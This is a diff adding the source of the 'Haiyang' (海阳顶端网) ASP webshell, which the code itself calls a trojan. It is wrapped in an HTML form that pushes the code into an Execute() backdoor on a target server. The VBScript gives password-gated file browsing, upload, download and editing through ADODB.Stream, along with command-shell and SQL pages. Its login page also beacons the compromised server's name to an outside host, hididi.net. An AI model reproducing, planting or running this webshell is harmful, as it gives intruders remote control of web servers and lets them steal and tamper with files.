@@ -1,0 +1,2095 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=gb2312"><title>海阳2006后门执行脚本</title></head><body><style>BODY {	FONT-SIZE: 9pt;	COLOR: #000000;	FONT-FAMILY: "Courier New";scrollbar-face-color:#E4E4F3;	scrollbar-highlight-color:#FFFFFF;	scrollbar-3dlight-color:#E4E4F3;scrollbar-darkshadow-color:#9C9CD3;	scrollbar-shadow-color:#E4E4F3;	scrollbar-arrow-color:#4444B3;scrollbar-track-color:#EFEFEF;}TABLE {	FONT-SIZE: 9pt;	FONT-FAMILY: "Courier New";	BORDER-COLLAPSE: collapse;border-top-width: 1px;	border-right-width: 1px;	border-bottom-width: 1px;	border-left-width: 1px;border-top-style:solid;	border-right-style: none;	border-bottom-style: none;	border-left-style: solid;	border-top-color: #d8d8f0;border-right-color: #d8d8f0;	border-bottom-color: #d8d8f0;	border-left-color: #d8d8f0;}.tr {	font-family: "Courier New";	font-size: 9pt;	background-color: #e4e4f3;	text-align: center;}.td {	font-family: "Courier New";	font-size: 9pt;	background-color: #f9f9fd;}.warningColor {	font-family: "Courier New";	font-size: 9pt;	color: #ff0000;}input {	font-family: "Courier New";	BORDER-TOP-WIDTH: 1px;	BORDER-LEFT-WIDTH: 1px;	FONT-SIZE: 12px;	BORDER-BOTTOM-WIDTH: 1px;BORDER-RIGHT-WIDTH: 1px;	color: #000000;}textarea {	font-family: "Courier New";	BORDER-TOP-WIDTH: 1px;	BORDER-LEFT-WIDTH: 1px;	FONT-SIZE: 12px;	BORDER-BOTTOM-WIDTH: 1px;	BORDER-RIGHT-WIDTH: 1px;	color: #000000;}A:link {	FONT-SIZE: 9pt; 	COLOR: #000000;	FONT-FAMILY: "Courier New"; 	TEXT-DECORATION: none;}tr {	font-family: "Courier New";	font-size: 9pt;	line-height: 18px;}td {	font-family: "Courier New";	font-size: 9pt;	border-top-width: 1px;	border-right-width: 1px;	border-bottom-width: 1px;	border-left-width: 1px;	border-top-style: none;	border-right-style: solid;	border-bottom-style: solid;	border-left-style: none;	border-top-color: #d8d8f0;	border-right-color: #d8d8f0;	border-bottom-color: #d8d8f0;	border-left-color: #d8d8f0;}.trHead {	font-family: "Courier New";	font-size: 9pt;	background-color: #e4e4f3;	line-height: 3px;}.inputLogin {	font-family: "Courier New";	font-size: 9pt;	border: 1px solid #d8d8f0;	background-color: #f9f9fd;	vertical-align: bottom;}</style><table width="760" border="0" align="center" cellpadding="0" cellspacing="0"><form id=frm method="post" target="_blank"><tr><td height="22" class="td"> &nbsp;海阳2005后门执行脚本 </td></tr><tr><td class="trHead">&nbsp;</td></tr><tr><td height="18" align="center" class="td">&nbsp;表单提交地址: <input name="theAction" type="text" id="theAction" value="{$SendTo}" size="60"> <input name="Submit422" type="button" class="inputLogin" onClick="this.form.fileContent.rows+=10;" value="+"> <input name="Submit42" type="button" class="inputLogin" onClick="if(this.form.fileContent.rows>11){this.form.fileContent.rows-=10;}" value="-"></td></tr><tr><td align="center" class="td"><input type=hidden name="{$ThePass}" id="sharp" value="Execute(&quot;Session(&quot;&quot;{$ThePass}&quot;&quot;)=Request(&quot;&quot;fileContent&quot;&quot;):Execute(Session(&quot;&quot;{$ThePass}&quot;&quot;))&quot;)"><textarea name="fileContent" cols="80" rows="30">	On Error Resume Next
+	Set ws=Server.CreateObject("WScript.Shell")
+	Set net=Server.CreateObject("WScript.Network")
+	Set fso=Server.CreateObject("Scripting.FileSystemObject")
+
+	dim url,shellStr, startTime, myCmdDotExeFile, pageName, applicationStr
+	shellStr="Shell"
+	applicationStr="Application"
+	startTime=timer()
+	session.timeout=40
+	pageName=request("pageName")
+	url=request.serverVariables("url")
+	myCmdDotExeFile="comm" &amp; "and.exe" '自己的cmd.exe文件名,如果不方便改源程序,执行时要在路径后面多加上 /c 
+
+	const m="xxxxx"
+	const mVersion="2005"
+	const userPassword="hididi.net" '登录密码
+	const adminPassword="haiyangtop.net" '二次密码
+	const clientPassword="#" '客户端密码,如果要插入数据库,则只能设置一位,请只使用数字和字母的组合
+	const sqlMaxLoopI=100
+	const notdownloadsExists=false
+	const editableFileExt="$log$asp$txt$php$ini$inc$htm$html$xml$conf$config$jsp$java$htt$bat$lst$aspx$php3$php4$js$css$bat$asa$"
+	
+	rem +--------------------------------------+
+	rem |	    这下面是页面的公共函数部分	   |
+	rem +--------------------------------------+
+	
+	sub echo(str)
+		response.write(str)
+	end sub
+	
+	sub onErr(str)
+		response.write("出错信息: "&amp;str&amp;"")
+		response.end()
+	end sub
+	
+	sub isIn(flag)
+		if flag=1 then
+			if session(m&amp;"userPassword")&lt;>userPassword then
+				echo "&lt;script language=""javascript"">alert('对不起,没有权限的操作,请先登录!');location.href='?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=default';&lt;/script>"
+				response.end
+			end if
+		 else
+		 	isIn(1)
+			if session(m&amp;"adminPassword")&lt;>adminPassword then
+				echo "&lt;script language=""javascript"">if(confirm('此操作要求二次鉴权\n现在进行这项操作吗?')){location.href='?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=login';}else{history.back();}&lt;/script>"
+				response.end
+			end if
+		end if
+	end sub
+	
+	function getTheSize(str)
+		dim theSize
+		theSize=str
+		if theSize>=(1024*1024*1024) then getTheSize=fix((theSize/(1024*1024*1024))*10)/10&amp;"G"
+		if theSize>=(1024*1024) and theSize&lt;(1024*1024*1024) then getTheSize=fix((theSize/(1024*1024))*10)/10&amp;"M"
+		if theSize>=1024 and theSize&lt;(1024*1024) then getTheSize=fix((theSize/1024)*10)/10&amp;"K"
+		if theSize>=0 and theSize &lt;1024 then getTheSize=theSize&amp;"B"
+	end function
+	
+	function getStrLen(str)
+		dim i
+		getStrLen=0
+		for i=1 to len(str)
+			if asc(mid(str,i,1))>0 and asc(mid(str,i,1))&lt;256 then
+				getStrLen=getStrLen+1
+			 else
+				getStrLen=getStrLen+2
+			end if
+		next
+	end function
+	
+	function getCutStr(str,n)
+		dim i,j
+		if n>len(str) then
+			n=len(str)
+		end if
+		for i=1 to n
+			if asc(mid(str,i,1))&lt;=0 or asc(mid(str,i,1))>=256 then
+				j=j+1
+			end if
+		next
+		getCutStr=left(str,n-j)
+	end function
+	
+	sub redirectTo(url)
+		response.redirect(url)
+	end sub
+	
+	sub showTitle(str)
+'		response.write("&lt;meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"&amp;vbNewLine)
+		response.write("&lt;title>"&amp;str&amp;" - 海阳顶端网ASP木马＠2005官方正式版 - By Marcos &amp; LCX &amp; Allen&lt;/title>")
+	end sub
+	
+	sub showExecuteTime()
+		response.write("&lt;br>&lt;center>"&amp;((timer-startTime)*1000)&amp;" ms&lt;/center>")
+	end sub
+	
+	function getParentFolder(thePath)
+		dim path
+		path=thePath
+		if right(path,1)="\" then
+			path=left(path,len(path)-1)
+		end if
+		if instr(path,"\")>0 then
+			getParentFolder=left(path,instrRev(path,"\"))
+		 else
+			getParentFolder=""
+		end if
+	end function
+	
+	sub chkErr(err,message)
+		if err then
+			err.clear
+			response.write "&lt;script language=""javascript"">alert('"&amp;message&amp;"');&lt;/script>"
+			response.end
+		end if
+	end sub
+	
+	function encodeForUrl(str,flag)
+		if flag=true then
+			encodeForUrl=replace(str,"\","\\")
+			encodeForUrl=replace(encodeForUrl,"'","\'")
+		 else
+			encodeForUrl=server.urlEncode(str)
+		 	encodeForUrl=replace(encodeForUrl,"%5C","\")
+		end if
+	end function
+	
+	function fixNull(str)
+		if isNull(str) then
+			fixNull=""
+		 else
+			fixNull=str
+		end if
+	end function
+	
+	sub streamUpload(thePath,fileName)
+		dim i,j,info,stream,streamT,theFile,overWrite,fileContent
+		theFile=request("theFile")
+		overWrite=request("overWrite")
+		if instr(fileName,":") then
+			fileName=fileName
+		 else
+			fileName=thePath&amp;"\"&amp;fileName
+		end if
+		server.scriptTimeOut=5000
+		set stream=server.createObject("adodb.stream")
+		set streamT=server.createObject("adodb.stream")
+		
+		with stream
+			.type=1
+			.mode=3
+			.open
+			.write request.binaryRead(request.totalBytes)
+			.position=0
+			fileContent=.read()
+			i=instrB(fileContent,chrB(13)&amp;chrB(10))
+			info=leftB(fileContent,i-1)
+			i=len(info)+2
+			i=instrB(i,fileContent,chrB(13)&amp;chrB(10)&amp;chrB(13)&amp;chrB(10))+4-1
+			j=instrB(i,fileContent,info)-1
+			streamT.Type=1
+			streamT.Mode=3
+			streamT.Open
+			stream.position=i
+			.copyTo streamT,j-i-2
+			on error resume next
+			if overWrite="true" then
+				streamT.saveToFile fileName,2
+			 else
+				streamT.saveToFile fileName
+			end if
+			if err.number=3004 then
+				err.clear
+				fileName=fileName&amp;"\"&amp;split(theFile,"\")(uBound(split(theFile,"\")))
+				if overWrite="true" then
+					streamT.saveToFile fileName,2
+				 else
+					streamT.saveToFile fileName
+				end if
+			end if
+			
+			chkErr err,err.description&amp;"\n可能同名文件已经存在.');history.back('"
+			echo "&lt;script language=""javascript"">alert('文件上传成功!\n"&amp;replace(fileName,"\","\\")&amp;"');&lt;/script>"
+			streamT.close
+			.close
+		end with
+		set stream=nothing
+		set streamT=nothing
+	end sub	
+	rem +-------------------------------+
+	rem |		下面是页面代码选择		|
+	rem +-------------------------------+
+	
+	if pageName&lt;>"stream" then
+		pageOther()
+		showMenu()
+	end if
+	
+	select case pageName
+		case "","default"
+			pageDefault()
+		case "server"
+			pageServer()
+		case "stream"
+			pageStream()
+		case "sql"
+			pageSql()
+		case "fso"
+			pageFso()
+		case "upload"
+			pageUpload()
+		case "cmdShell"
+			pageCmdShell()
+		case "login"
+			pageLogin()
+		case "app"
+			pageApp()
+	end select
+	rem +-------------------------------+
+	rem |		下面是各独立功能代码		|
+	rem +-------------------------------+
+	sub pageDefault()
+		dim theAct,password
+		theAct=request("theAct")
+		password=request("password")
+		if theAct="chkLogin" then
+			if password=userPassword then
+				session(m&amp;"userPassword")=userPassword
+				redirectTo(url&amp;"?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=server")
+			 else
+				redirectTo(url&amp;"?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=default")
+			end if
+		end if
+		
+		showTitle("管理登录")
+		echo "&lt;body onload=""formx.password.focus();"">"
+Response.Write "&lt;table width=""416"" border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;form name=""formx"" method=""post"" action=""?pageName=default&amp;theAct=chkLogin"" onSubmit=""return default_canLogin(this);"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""25"" align=""center"" class=""td"">管理登录&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""75"" align=""center"">" &amp; vbNewLine
+Response.Write "&lt;input name=""password"" type=""password"" class=""inputLogin"" id=""password"" style=""background-color:#ffffff;"">" &amp; vbNewLine
+Response.Write "&lt;input type=""submit"" name=""Submit"" value=""LOGIN"" class=""inputLogin"">" &amp; vbNewLine
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""25"" align=""center"" class=""td"">海阳顶端网ASP木马＠2005版&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+		echo "&lt;/body>"
+		showExecuteTime()
+	end sub
+	sub pageLogin()
+		dim theAct,password
+		isIn(1)
+		theAct=request("theAct")
+		password=request("password")
+		if theAct="chkLogin" then
+			if password=adminPassword then
+				session(m&amp;"adminPassword")=adminPassword
+				redirectTo(url&amp;"?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=stream")
+			 else
+				redirectTo(url&amp;"?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=login")
+			end if
+		end if
+				
+		showTitle("管理登录")
+		echo "&lt;body onload=""formx.password.focus();"">"
+Response.Write "&lt;table width=""416"" border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;form name=""formx"" method=""post"" action=""?pageName=login&amp;theAct=chkLogin"" onSubmit=""return default_canLogin(this);"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""25"" align=""center"" class=""td"">管理密码验证&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""75"" align=""center"">" &amp; vbNewLine
+Response.Write "&lt;input name=""password"" type=""password"" class=""inputLogin"" id=""password"" style=""background-color:#ffffff;"">" &amp; vbNewLine
+Response.Write "&lt;input type=""submit"" name=""Submit"" value=""LOGIN"" class=""inputLogin"">" &amp; vbNewLine
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""25"" align=""center"" class=""td"">海阳顶端网ASP木马＠2005版&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;script language=javascript src=""http://hididi.net/ASPAdmin/ASPAdmin_T.asp?theUrl=http://" &amp; Request.ServerVariables("SERVER_NAME") &amp; "&amp;productName=HYTop2005"">&lt;/script>"
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+		echo "&lt;/body>"
+		showExecuteTime()
+	end sub
+	sub pageStream()
+		isIn(2)
+		dim theAct,thePath,toPath,fileName
+		theAct=request("theAct")
+		toPath=request("toPath")
+		thePath=request("thePath")
+		fileName=request("fileName")
+		
+		if thePath="" then
+			thePath=server.mapPath(".")
+		end if
+	
+		select case theAct
+			case "save"
+				streamEditFile(thePath)
+				response.end
+			case "down"
+				downTheFile(thePath)
+				response.end
+			case "saveAsTwo"
+				saveAsTwo thePath,toPath
+				response.end
+		end select
+		showTitle("流操作页面")
+		pageOther()
+		showMenu()
+		
+		select case theAct
+			case "edit"
+				streamEditFile(thePath)
+				response.end
+			case "upload"
+				streamUpload thePath,fileName
+				echo "&lt;script language=""javascript"">location.href='?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=stream&amp;thePath="&amp;encodeForUrl(thePath,true)&amp;"';&lt;/script>"
+				response.end
+		end select
+Response.Write "&lt;table width=""760"" border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" colspan=""2"" class=""td"">&amp;nbsp;" &amp; request.serverVariables("server_name") &amp; "" &amp; vbNewLine
+Response.Write "- Adodb.Stream Back Door&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""2"" class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" onSubmit=""this.Submit3.disabled=true;"" action=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=stream"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""2"" class=""td"">&amp;nbsp;PATH:" &amp; vbNewLine
+Response.Write "&lt;input name=""thePath"" type=""text"" id=""thePath"" value=""" &amp; thePath &amp; """ size=""60"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit3"" value=""查 看"" onclick=""location.href='?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=stream&amp;thePath='+this.form.thePath.value;this.disabled=true;"">" &amp; vbNewLine
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" enctype=""multipart/form-data"" action=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=stream&amp;theAct=upload&amp;thePath=" &amp; encodeForUrl(thePath,false) &amp; """ onsubmit=""return upload_canSubmit(this);"">" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""2"" class=""td"">&amp;nbsp;" &amp; vbNewLine
+Response.Write "&lt;input name=""file"" type=""file"" size=""25"">" &amp; vbNewLine
+Response.Write "保存为" &amp; vbNewLine
+Response.Write "&lt;input name=""fileName"" type=""text"" value=""" &amp; thePath &amp; """ size=""35"">" &amp; vbNewLine
+Response.Write "&lt;input name=""Submit"" type=""submit"" id=""Submit"" value=""上 传"" onClick=""this.form.action+='&amp;theFile='+this.form.file.value+'&amp;overWrite='+this.form.writeMode.checked;"">" &amp; vbNewLine
+Response.Write "&lt;input type=""checkbox"" name=""writeMode"" value=""True"">覆盖模式" &amp; vbNewLine
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""2"" class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td width=""30%"" class=""td"" valign=""top"">" &amp; vbNewLine
+Response.Write "" &amp; vbNewLine
+call streamGetFolderList(thePath,true)
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td width=""555"" valign=""top"">" &amp; vbNewLine
+Response.Write "" &amp; vbNewLine
+call streamGetFolderList(thePath,false)
+Response.Write "&lt;br> &lt;div id=""loaded"" style=""display:none;"">" &amp; vbNewLine
+Response.Write "&lt;iframe id=""fileEditor"" frameborder=""0"" scrolling=""no"" valign=""top"" width=""100%"" height=""475"">&lt;/iframe>" &amp; vbNewLine
+Response.Write "&lt;/div>&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""2"" class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr align=""right"">" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" colspan=""2"" class=""td"">Powered By &lt;a href=""javascript:;"" title=""QQ:26696782"">Marcos&lt;/a> 2004.11&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+Response.Write "&lt;a name=""foot"">&lt;/a>" &amp; vbNewLine
+		showExecuteTime()
+	end sub
+	
+	sub streamEditFile(thePath)
+		dim fileName,fileContent,userCharset
+		fileName=thePath
+		userCharset=request("userCharset")
+		
+		if request("theAct")="save" then
+			fileContent=request("fileContent")
+			streamWriteToFile thePath,fileContent
+			response.end
+		end if
+		
+		fileContent=streamReadFromFile(fileName,request("userCharset"))
+Response.Write "&lt;table border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" action=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=stream&amp;theAct=save"" onsubmit=""if(confirm('您确认要保存当前文件吗?')){this.Submit.disabled=true;this.Submit2.disabled=true;this.Submit3.disabled=true;}else{return false;}"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td>&lt;input name=""thePath"" type=""text"" id=""thePath"" value=""" &amp; thePath &amp; """ size=""50"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit6"" value=""查 看"" onclick=""location.href='?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=stream&amp;theAct=edit&amp;thePath='+this.form.thePath.value;this.disabled=true;"">&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td>&lt;textarea name=""fileContent"" cols=""70"" rows=""25"" id=""fileContent"">" &amp; server.htmlEncode(fileContent) &amp; "&lt;/textarea>&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""50"" align=""right"">&lt;font class=""warningColor"">非GB2312编码文件可能无法正确保存!&lt;/font>" &amp; vbNewLine
+Response.Write "&lt;input name=""userCharset"" type=""text"" value=""" &amp; userCharset &amp; """ size=""10"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" value=""重新编码"" name=""Submit3"" onclick=""location.href='?" &amp; replace("pageName=stream&amp;thePath="&amp;thePath&amp;"&amp;theAct=edit","\","\\") &amp; "&amp;userCharset='+this.form.userCharset.value;this.disabled=true;"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit"" value=""保 存"" onClick=""if(confirm('确认保存修改?')){this.form.submit();}"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit2"" value=""另存为"" onclick=""stream_saveAs(this.form,'" &amp; encodeForUrl(thePath,true) &amp; "');"">" &amp; vbNewLine
+Response.Write "&amp;nbsp; &lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+Response.Write "&lt;a name=""foot"">&lt;/a>" &amp; vbNewLine
+		showExecuteTime()
+	end sub
+	
+	sub streamGetFolderList(thePath,showFolder)
+		dim sa,ext,flag,list,folders,theHref
+		set sa=server.createObject(shellStr&amp;"."&amp;applicationStr)
+		if len(thePath)=2 then
+			thePath=thePath&amp;"\"
+		end if
+		set folders=sa.namespace(thePath)
+		if showFolder=true and getParentFolder(thePath)&lt;>"" then
+			echo "&amp;nbsp;&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=stream&amp;thePath="&amp;encodeForUrl(getParentFolder(thePath),false)&amp;""">..&lt;/a>&lt;br>"
+		end if
+		on error resume next
+		for each list in folders.items
+			if showFolder=true and list.isfolder Then
+				echo "&amp;nbsp;&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=stream&amp;thePath="&amp;encodeForUrl(list.path,false)&amp;""">["
+				echo replace(replace(lcase(list.path),lcase(thePath),""),"\","")
+				echo "]&lt;/a>&lt;br>"
+			 else
+				if showFolder=false and (not list.isfolder) Then
+					ext=split(list.path,".")(uBound(split(list.path,".")))
+					flag=instr(lcase(editableFileExt),lcase("$"&amp;ext&amp;"$"))
+					if instr(lcase(list.path),lcase(server.mapPath("/"))) then
+						theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath("/")),""),2),false)
+						echo "&amp;nbsp;&lt;a href=""/"&amp;theHref&amp;""" target=_blank>"&amp;replace(replace(lcase(list.path),lcase(thePath),""),"\","")&amp;"&lt;/a>"
+					 else
+						echo "&amp;nbsp;"&amp;replace(replace(lcase(list.path),lcase(thePath),""),"\","")
+					end if
+					echo "&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href=javascript:; onclick=""stream_downIt('" &amp; encodeForUrl(list.path, False) &amp; "');"">&lt;font class=warningColor>Down&lt;/font>&lt;/a>-"
+					if flag>0 then
+						echo "&lt;a href=#foot onclick=""stream_editIt('" &amp; encodeForUrl(list.path, False) &amp; "');"">&lt;font class=warningColor>Edit&lt;/font>&lt;/a>-"
+					end if
+					echo "&lt;a href=javascript:; onclick=""stream_saveAsTwo('"&amp;encodeForUrl(list.path,true)&amp;"','"&amp;encodeForUrl(list.path, False)&amp;"');"">&lt;font class=warningColor>SaveAs&lt;/font>&lt;/a>-"
+					echo getTheSize(list.size)
+					echo "&lt;br>"
+				end if
+			end if
+		next
+		if err then
+			onErr err.description
+		end if
+	end sub
+	
+	sub downTheFile(thePath)
+		dim stream,fileName,fileContentType
+		fileName=split(thePath,"\")(uBound(split(thePath,"\")))
+		set stream=server.createObject("adodb.stream")
+		stream.open
+		stream.type=1
+		stream.loadFromFile(thePath)
+		fileContentType=getContentType(fileName)
+		response.addHeader "Content-Disposition", "attachment; filename=" &amp; fileName
+		response.addHeader "Content-Length",stream.Size
+		response.charset="UTF-8"
+		response.contentType=fileContentType
+		response.binaryWrite stream.read 
+		response.flush
+		stream.close
+		set stream=nothing
+	end sub
+	
+	function getContentType(fileName)
+		select case split(fileName,".")(uBound(split(fileName,".")))
+			case "asf"
+				getContentType="video/x-ms-asf"
+			case "avi"
+				getContentType="video/avi"
+			case "doc"
+				getContentType="application/msword"
+			case "zip"
+				getContentType="application/zip"
+			case "xls"
+				getContentType="application/vnd.ms-excel"
+			case "gif"
+				getContentType="image/gif"
+			case "jpg", "jpeg"
+				getContentType="image/jpeg"
+			case "wav"
+				getContentType="audio/wav"
+			case "mp3"
+				getContentType="audio/mpeg3"
+			case "mpg", "mpeg"
+				getContentType="video/mpeg"
+			case "rtf"
+				getContentType="application/rtf"
+			case "htm", "html"
+				getContentType="text/html"
+			case "txt","js"
+				getContentType="text/plain"
+			case else
+				getContentType="application/octet-stream"
+		end select
+	end function
+	
+	sub saveAsTwo(thePath,toPath)
+		on error resume next
+		dim stream
+		if lTrim(thePath)=lTrim(toPath) then
+			echo "&lt;script>alert('源路径与目标路径相同,操作停止!');&lt;/script>"
+			response.end
+		end if
+		set stream=server.createObject("adodb.stream")
+		stream.type=1
+		stream.open
+		stream.loadFromFile thePath
+		chkErr err,err.description
+		stream.saveToFile toPath,2
+		echo "&lt;script language=""javascript"">alert('另存为操作成功!');&lt;/script>"
+		set stream=nothing
+	end sub
+	
+	function streamReadFromFile(thePath,userCharset)
+		dim stream
+		set stream=server.createObject("adodb.stream")
+		with stream
+			.type=2
+			.mode=3
+			.open
+			on error resume next
+			.loadFromFile thePath
+			chkErr err,err.description
+			if userCharset&lt;>"" then
+				.charset=userCharset
+			 else
+				.charset="gb2312"
+			end if
+			chkErr err,"编码类型错误!"
+			.Position=2
+			streamReadFromFile=.readText()
+			.close
+		end with
+		set stream=nothing
+	end function
+	
+	sub streamWriteToFile(thePath,fileContent)
+		dim stream
+		set stream=server.createObject("adodb.stream")
+		with stream
+			.type=2
+			.mode=3
+			.open
+			.charset="gb2312"
+			.writeText fileContent
+			.saveToFile thePath,2
+			.close
+		end with
+		set stream=nothing
+		echo "文件保存成功! [&lt;a href="""&amp;request.serverVariables("http_referer")&amp;""">返回&lt;/a>]"
+	end sub
+	sub pageServer()
+		dim i,obj,theAct,theStr
+		isIn(1)
+		theAct=request("theAct")
+		showTitle("服务器相关数据")
+		
+		dim t1,t2,lsabc,theTime
+		
+		if theAct="showService" then
+			theTime="系统服务列表打开时不执行速度测试"
+			theStr="&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=server"">关闭系统服务列表&lt;/a>"
+		 else
+			t1=timer()
+			for i=1 to 500000
+				lsabc=1+1
+			next
+			t2=timer()
+			theTime=cstr(int(((t2-t1)*10000)+0.5)/10)&amp;" 毫秒(50万次1+1运算所需时间)"
+			theStr="&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=server&amp;theAct=showService"">打开系统服务列表&lt;/a>"
+		end if
+Response.Write "&lt;table width=560 border=0 align=""center"" cellpadding=0 cellspacing=0>" &amp; vbNewLine
+Response.Write "&lt;tr align=""center"" class=""td"" onmouseover=""this.className='';"" onMouseOut=""this.className='td'"" height=18>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" colspan=""2"" class=""td"">服务器相关数据&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr align=""center"" class=""td"" onmouseover=""this.className='';"" onMouseOut=""this.className='td'"">" &amp; vbNewLine
+Response.Write "&lt;td height=""0"" colspan=""2"" class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr class=""td"" height=18 onmouseover=""this.className='';"" onMouseOut=""this.className='td'"">" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=left>&amp;nbsp;服务器名&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"">&amp;nbsp;" &amp; request.serverVariables("SERVER_NAME") &amp; "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
